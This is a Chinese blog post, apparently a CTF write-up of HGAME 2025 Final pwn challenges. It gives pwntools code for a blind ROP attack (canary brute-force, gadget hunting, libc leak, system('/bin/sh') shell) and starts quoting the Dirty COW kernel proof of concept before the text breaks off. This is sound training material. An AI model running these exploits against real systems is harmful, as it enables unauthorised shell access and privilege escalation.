<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#54C8C4" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
<link rel="preconnect" href="https://fonts.googleapis.com" crossorigin>
<link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin>
  <link rel="apple-touch-icon" sizes="180x180" href="/images/180pixil-frame-0.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/32pixil-frame-0.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/16pixil-frame-0.png">
  <link rel="mask-icon" href="/images/pixil-frame-0.png.svg" color="#54C8C4">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic%7CNoto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha256-5eIC48iZUHmSlSUz9XtjRyK2mzQkHScZY1WdMaoz74E=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.21.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":"mac","style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeIn","post_block":"fadeIn","post_header":"fadeIn","post_body":"fadeIn"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="Backto2016  但你必须先向我们证明自己有回到 2016 的实力！ 祝你玩的开心 o (￣▽￣) ブ 没有附件是正常的喵 这个分数或许也考虑了买 hint 这件事，别害怕嘻嘻  这道题是没有给出附件的，我们需要根据输入和程序的输出获取一切信息。">
<meta property="og:type" content="article">
<meta property="og:title" content="HGAME 2025 Final 复现">
<meta property="og:url" content="http://example.com/2025/03/20/2025320-HGAME-2025-Final-%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="蘅芷清芬">
<meta property="og:description" content="Backto2016  但你必须先向我们证明自己有回到 2016 的实力！ 祝你玩的开心 o (￣▽￣) ブ 没有附件是正常的喵 这个分数或许也考虑了买 hint 这件事，别害怕嘻嘻  这道题是没有给出附件的，我们需要根据输入和程序的输出获取一切信息。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2025320-HGAME-2025-Final-%E5%A4%8D%E7%8E%B0/image-20250320223509755.png">
<meta property="og:image" content="http://example.com/2025320-HGAME-2025-Final-%E5%A4%8D%E7%8E%B0/image-20250320223905338.png">
<meta property="og:image" content="http://example.com/2025320-HGAME-2025-Final-%E5%A4%8D%E7%8E%B0/image-20250320224713735.png">
<meta property="og:image" content="http://example.com/2025320-HGAME-2025-Final-%E5%A4%8D%E7%8E%B0/image-20250321183913870.png">
<meta property="og:image" content="http://example.com/2025320-HGAME-2025-Final-%E5%A4%8D%E7%8E%B0/image-20250321191706066.png">
<meta property="og:image" content="http://example.com/2025320-HGAME-2025-Final-%E5%A4%8D%E7%8E%B0/image-20250401111921507.png">
<meta property="og:image" content="http://example.com/2025320-HGAME-2025-Final-%E5%A4%8D%E7%8E%B0/image-20250402223714523.png">
<meta property="og:image" content="http://example.com/2025320-HGAME-2025-Final-%E5%A4%8D%E7%8E%B0/image-20250402224043883.png">
<meta property="og:image" content="http://example.com/2025320-HGAME-2025-Final-%E5%A4%8D%E7%8E%B0/image-20250402225857712.png">
<meta property="og:image" content="http://example.com/2025320-HGAME-2025-Final-%E5%A4%8D%E7%8E%B0/image-20250402225927656.png">
<meta property="og:image" content="http://example.com/2025320-HGAME-2025-Final-%E5%A4%8D%E7%8E%B0/image-20250402230038064.png">
<meta property="og:image" content="http://example.com/2025320-HGAME-2025-Final-%E5%A4%8D%E7%8E%B0/image-20250402230133893.png">
<meta property="article:published_time" content="2025-03-19T16:00:00.000Z">
<meta property="article:modified_time" content="2025-04-02T15:09:32.410Z">
<meta property="article:author" content="summ2">
<meta property="article:tag" content="pwn">
<meta property="article:tag" content="hgame">
<meta property="article:tag" content="kernel">
<meta property="article:tag" content="blind pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2025320-HGAME-2025-Final-%E5%A4%8D%E7%8E%B0/image-20250320223509755.png">


<link rel="canonical" href="http://example.com/2025/03/20/2025320-HGAME-2025-Final-%E5%A4%8D%E7%8E%B0/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2025/03/20/2025320-HGAME-2025-Final-%E5%A4%8D%E7%8E%B0/","path":"2025/03/20/2025320-HGAME-2025-Final-复现/","title":"HGAME 2025 Final 复现"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>HGAME 2025 Final 复现 | 蘅芷清芬</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">蘅芷清芬</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa-solid fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-ctf"><a href="/categories/CTF" rel="section"><i class="fa-solid fa-flag fa-fw"></i>CTF</a></li><li class="menu-item menu-item-日常"><a href="/categories/%E6%97%A5%E5%B8%B8" rel="section"><i class="fa-solid fa-file fa-fw"></i>日常</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa-solid fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa-solid fa-link fa-fw"></i>友链</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#backto2016"><span class="nav-number">1.</span> <span class="nav-text">Backto2016</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#vulnerabilities"><span class="nav-number">1.1.</span> <span class="nav-text">Vulnerabilities</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exploit"><span class="nav-number">1.2.</span> <span class="nav-text">Exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#canary-bypass"><span class="nav-number">1.2.1.</span> <span class="nav-text">Canary bypass</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#stop-gadget"><span class="nav-number">1.2.2.</span> <span class="nav-text">Stop gadget</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#common-gadget"><span class="nav-number">1.2.3.</span> <span class="nav-text">Common gadget</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dump-memory"><span class="nav-number">1.2.4.</span> <span class="nav-text">Dump memory</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#get-shell"><span class="nav-number">1.3.</span> <span class="nav-text">Get shell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#backto20162"><span class="nav-number">2.</span> <span class="nav-text">Backto2016(2)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#copy-on-write3"><span class="nav-number">2.1.</span> <span class="nav-text">Copy On Write3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dirty-cow4"><span class="nav-number">2.2.</span> <span class="nav-text">Dirty-cow4</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#references"><span class="nav-number">3.</span> <span class="nav-text">References</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">summ2</p>
  <div class="site-description" itemprop="description">summ2's blog</div>
</div>
  <div class="links-of-author animated">
      <span class="links-of-author-item">
        <a href="https://github.com/avasummer" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;avasummer" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i></a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:summ2@hdu.edu.cn" title="E-Mail → mailto:summ2@hdu.edu.cn" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i></a>
      </span>
  </div>
  <div class="cc-license animated" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
  </div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/03/20/2025320-HGAME-2025-Final-%E5%A4%8D%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="summ2">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="蘅芷清芬">
      <meta itemprop="description" content="summ2's blog">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="HGAME 2025 Final 复现 | 蘅芷清芬">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          HGAME 2025 Final 复现
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-03-20 00:00:00" itemprop="dateCreated datePublished" datetime="2025-03-20T00:00:00+08:00">2025-03-20</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1 id="backto2016">Backto2016</h1>
<blockquote>
<p>但你必须先向我们证明自己有回到 2016 的实力！</p>
<p>祝你玩的开心 o (￣▽￣) ブ</p>
<p><strong>没有附件是正常的喵</strong></p>
<p><strong>这个分数或许也考虑了买 hint 这件事，别害怕嘻嘻</strong></p>
</blockquote>
<p>这道题是没有给出附件的，我们需要根据输入和程序的输出获取一切信息。
<span id="more"></span></p>
<p><img src="\2025320-HGAME-2025-Final-复现\image-20250320223509755.png"></p>
<h2 id="vulnerabilities">Vulnerabilities</h2>
<p>随便输入一些字符会发现，程序存在<strong>栈溢出</strong>漏洞，出题人很友好地提供了程序崩溃的更多信息（***
stack smashing detected ***: terminated）</p>
<p>存在 <strong>Canary 保护</strong>。</p>
<p><img src="\2025320-HGAME-2025-Final-复现\image-20250320223905338.png"></p>
<p>注意到在交互进程结束后，会保持连接，返回一个 PID+1 的新进程，这提示我们程序使用 <code>fork()</code> 实现功能。</p>
<figure>
<img src="\2025320-HGAME-2025-Final-复现\image-20250320224713735.png" alt="赛后放出的源码">
<figcaption aria-hidden="true">赛后放出的源码</figcaption>
</figure>
<p>因此，子进程的 Canary 值不会改变。</p>
<h2 id="exploit">Exploit</h2>
<p>从题目的提示可以知道，其实这是类似于 HCTF2016 brop<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a> 的一道题目。</p>
<p>运用的攻击方法叫做 Blind Return Oriented Programming (BROP)<a href="#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a>。</p>
<p>BROP 的主要流程：</p>
<ol type="1">
<li><p>绕过 Canary 和 PIE 的保护；</p></li>
<li><p>寻找 "stop gadget";</p></li>
<li><p> 寻找控制寄存器的 gadget;</p></li>
<li><p>dump memory to get the binary</p></li>
<li><p> 获得 libc base，然后 get shell</p></li>
</ol>
<h3 id="canary-bypass">Canary bypass</h3>
<p>BROP 首先需要我们绕过 Canary：</p>
<figure>
<img src="\2025320-HGAME-2025-Final-复现\image-20250321183913870.png" alt="Stack reading. A single byte on the stack is overwritten with guess X. If the service crashes, the wrong value was guessed.">
<figcaption aria-hidden="true">Stack reading. A single byte on the stack
is overwritten with guess X. If the service crashes, the wrong value was
guessed.</figcaption>
</figure>
<h3 id="stop-gadget">Stop gadget</h3>
<p>Stop gadget 指的是可以将程序挂起的一段 gadget。</p>
<p>为什么需要 Stop gadget? 如果我们将 Return
address 覆盖成随机的数据，那么很大概率会引发段错误。而 Stop
gadget 能让程序保持正常运行，在寻找其他 gadget 时起到了区分作用。</p>
<figure>
<img src="\2025320-HGAME-2025-Final-复现\image-20250321191706066.png" alt="stop gadget is useful!">
<figcaption aria-hidden="true">stop gadget is useful!</figcaption>
</figure>
<p>当我们成功找到了一个 gadget，<code>$rsp</code> 进入寄存器，程序进入 <code>$rsp+8&lt;stop_gadget&gt;</code>。</p>
<p>如果还未找到这个 gadget，程序会直接发生段错误。这个作用在下一节会更具体地体现。</p>
<h3 id="common-gadget">Common gadget</h3>
<p>在 Ubuntu
14.04 中，我们有一个很好的函数<code>__libc_csu_init()</code>，里面存在控制传参寄存器的 gadget，具体请参考<a target="_blank" rel="noopener" href="https://www.bookstack.cn/read/CTF-All-In-One/doc-4.7_common_gadget.md">通用
gadget</a>。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040082a &lt;+90&gt;:    5b      pop    rbx</span><br><span class="line">0x000000000040082b &lt;+91&gt;:    5d      pop    rbp</span><br><span class="line">0x000000000040082c &lt;+92&gt;:    41 5c   pop    r12</span><br><span class="line">0x000000000040082e &lt;+94&gt;:    41 5d   pop    r13</span><br><span class="line">0x0000000000400830 &lt;+96&gt;:    41 5e   pop    r14</span><br><span class="line">0x0000000000400832 &lt;+98&gt;:    41 5f   pop    r15</span><br><span class="line">0x0000000000400834 &lt;+100&gt;:   c3      ret</span><br></pre></td></tr></tbody></table></figure>
<p>所以，我们可以这样布置栈数据：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload = flat({</span><br><span class="line">    offset: [</span><br><span class="line">        canary,</span><br><span class="line">        p64(<span class="number">1</span>),</span><br><span class="line">        p64(pop_gadget),</span><br><span class="line">        p64(<span class="number">0</span>)*<span class="number">6</span>,</span><br><span class="line">        p64(stop_gadget)</span><br><span class="line">        ]</span><br><span class="line">    })</span><br></pre></td></tr></tbody></table></figure>
<p>但是还存在一个小问题，如果遍历时 <code>pop_gadget</code> 恰好是另一个 stop
gadget，程序也不会发生段错误，和执行到真正的 gadget 处结果一样。</p>
<p>因此，我们还需要进一步验证，它是否我们需要的。</p>
<p>在这道题中，我找到的 stop gadget 会输出一些固定字符：</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="string">b"killed by"</span> <span class="keyword">not</span> <span class="keyword">in</span> resp):</span><br><span class="line">    payload = flat({</span><br><span class="line">            offset: [</span><br><span class="line">                canary,</span><br><span class="line">                p64(<span class="number">1</span>),</span><br><span class="line">                p64(pop_gadget)</span><br><span class="line">                ]</span><br><span class="line">            })</span><br><span class="line">            p.sendafter(<span class="string">"password"</span>,payload)</span><br><span class="line">            resp = p.recv()</span><br><span class="line">            resp = p.recv()</span><br><span class="line">            log.success(<span class="string">f"stop_gadget[<span class="subst">{i}</span>] = <span class="subst">{<span class="built_in">hex</span>(stop_gadget)}</span>"</span>)</span><br><span class="line">            log.success(<span class="string">f"pop_gadget[<span class="subst">{i}</span>] = <span class="subst">{<span class="built_in">hex</span>(pop_gadget)}</span>"</span>)</span><br><span class="line">            choose = <span class="built_in">input</span>(<span class="string">"Continue?"</span>)</span><br><span class="line">            <span class="keyword">if</span>(choose==<span class="string">"y"</span> <span class="keyword">or</span> choose==<span class="string">"Y"</span>):<span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></tbody></table></figure>
<p>观察回显，如果没有输出，那么这大概率是正确的。当然在后续过程中我们可以更确定这个 gadget 是不是真的。</p>
<h3 id="dump-memory">Dump memory</h3>
<p>得到需要的 gadget，就可以开始 dump memory 了。</p>
<p>为了找到 <code>write()</code> 的 plt 地址，可以将 <code>$rdi</code> 赋值 <code>0x400000</code>，即 <code>write(0x400000)</code>，如果地址正确，我们会得到 ELF 头几个固定字符：<code>\x7fELF</code></p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    put_addr += <span class="number">1</span></span><br><span class="line">    payload = flat({</span><br><span class="line">    offset: [</span><br><span class="line">        canary,</span><br><span class="line">        p64(<span class="number">1</span>),</span><br><span class="line">        p64(pop_gadget),</span><br><span class="line">        p64(<span class="number">0x400000</span>),<span class="comment">#pop rdi</span></span><br><span class="line">        p64(put_addr),</span><br><span class="line">        p64(stop_gadget)</span><br><span class="line">        ]</span><br><span class="line">    })</span><br><span class="line">    p.sendafter(<span class="string">"password"</span>,payload)</span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        resp = p.recv()</span><br><span class="line">        resp = p.recv()</span><br><span class="line">        <span class="keyword">if</span> ( <span class="string">b"\x7fELF"</span> <span class="keyword">in</span> resp):</span><br><span class="line">            log.success(<span class="string">f"put found[<span class="subst">{i}</span>] = <span class="subst">{<span class="built_in">hex</span>(put_addr)}</span>"</span>)</span><br><span class="line">            choose = <span class="built_in">input</span>(<span class="string">"Continue?"</span>)</span><br><span class="line">            <span class="keyword">if</span>(choose==<span class="string">"y"</span> <span class="keyword">or</span> choose==<span class="string">"Y"</span>):<span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></tbody></table></figure>
<p><img src="\2025320-HGAME-2025-Final-复现/image-20250401111921507.png"></p>
<p>回顾 <code>plt</code> 表的知识，我们知道，已经调用过的函数地址会被保存在<code>.got</code> 段中。</p>
<h2 id="get-shell">Get shell</h2>
<p>后续过程就比较简单了，写 ROP 链即可。</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">stop_gadget=<span class="number">0x400700</span></span><br><span class="line">pop_gadget=<span class="number">0x400b2a</span>+<span class="number">0x9</span></span><br><span class="line">put_addr = <span class="number">0x400715</span></span><br><span class="line">got_addr = <span class="number">0x602018</span></span><br><span class="line">payload = flat({</span><br><span class="line">      offset: [</span><br><span class="line">        canary,</span><br><span class="line">        p64(<span class="number">1</span>),</span><br><span class="line">        p64(pop_gadget),</span><br><span class="line">        p64(got_addr),<span class="comment">#pop rdi</span></span><br><span class="line">        p64(put_addr),</span><br><span class="line">    ]</span><br><span class="line">})</span><br><span class="line">p.sendafter(<span class="string">"password:\n"</span>,payload)</span><br><span class="line">put_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">log.success(<span class="built_in">hex</span>(put_addr))</span><br><span class="line">libc_base = put_addr - libc.sym[<span class="string">"puts"</span>]</span><br><span class="line">log.success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">"system"</span>]</span><br><span class="line">binsh_addr = libc_base +<span class="built_in">next</span>(libc.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload = flat({</span><br><span class="line">      offset: [</span><br><span class="line">        canary,</span><br><span class="line">        p64(<span class="number">1</span>),</span><br><span class="line">        p64(pop_gadget),</span><br><span class="line">        p64(binsh_addr),<span class="comment">#pop rdi</span></span><br><span class="line">        p64(sys_addr),</span><br><span class="line">    ]</span><br><span class="line">})</span><br><span class="line">p.sendafter(<span class="string">"password:"</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>
<h1 id="backto20162">Backto2016(2)</h1>
<p>这题赛时并没有做出来（而且靶机跑的很慢，爆破不动），后面看了 wp 了解到这是一个 kernel
vulnerability。</p>
<h2 id="copy-on-write3">Copy On Write<a href="#fn3" class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a></h2>
<blockquote>
<p><strong>Copy-on-write</strong> (<strong>COW</strong>), also called
<strong>implicit sharing</strong>or <strong>shadowing</strong>,is a <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Resource_management_(computing)">resource-management</a>
technique used in <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Computer_programming">programming</a>
to manage shared data efficiently. Instead of copying data right away
when multiple programs use it, the same data is shared between programs
until one tries to modify it. If no changes are made, no private copy is
created, saving <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/System_resource#General_resources">resources</a>.
A copy is only made when needed, ensuring each program has its own
version when modifications occur. This technique is commonly applied to
memory, files, and data structures.</p>
</blockquote>
<p>例如 <code>fork()</code> 创建子进程时，为了节省内存空间和时间开销，使用了写时复制的策略。</p>
<figure>
<img src="\2025320-HGAME-2025-Final-复现/image-20250402223714523.png" alt="Take a lot space and time">
<figcaption aria-hidden="true">Take a lot space and time</figcaption>
</figure>
<figure>
<img src="\2025320-HGAME-2025-Final-复现/image-20250402224043883.png" alt="Copy-on-write">
<figcaption aria-hidden="true">Copy-on-write</figcaption>
</figure>
<h2 id="dirty-cow4">Dirty-cow<a href="#fn4" class="footnote-ref" id="fnref4" role="doc-noteref"><sup>4</sup></a></h2>
<p>通过 <code>mmap()</code> 映射文件到内存，利用写时复制，
<code>write</code> 和 <code>madvise()</code> 导致的条件竞争漏洞。</p>
<p>下面是它的一个 POC，可参见：<a target="_blank" rel="noopener" href="https://github.com/dirtycow/dirtycow.github.io">https://github.com/dirtycow/dirtycow.github.io</a></p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">####################### dirtyc0w.c #######################</span></span><br><span class="line"><span class="comment">$ sudo -s</span></span><br><span class="line"><span class="comment"># echo this is not a test &gt; foo</span></span><br><span class="line"><span class="comment"># chmod 0404 foo</span></span><br><span class="line"><span class="comment">$ ls -lah foo</span></span><br><span class="line"><span class="comment">-r-----r-- 1 root root 19 Oct 20 15:23 foo</span></span><br><span class="line"><span class="comment">$ cat foo</span></span><br><span class="line"><span class="comment">this is not a test</span></span><br><span class="line"><span class="comment">$ gcc -pthread dirtyc0w.c -o dirtyc0w</span></span><br><span class="line"><span class="comment">$ ./dirtyc0w foo m00000000000000000</span></span><br><span class="line"><span class="comment">mmap 56123000</span></span><br><span class="line"><span class="comment">madvise 0</span></span><br><span class="line"><span class="comment">procselfmem 1800000000</span></span><br><span class="line"><span class="comment">$ cat foo</span></span><br><span class="line"><span class="comment">m00000000000000000</span></span><br><span class="line"><span class="comment">####################### dirtyc0w.c #######################</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span 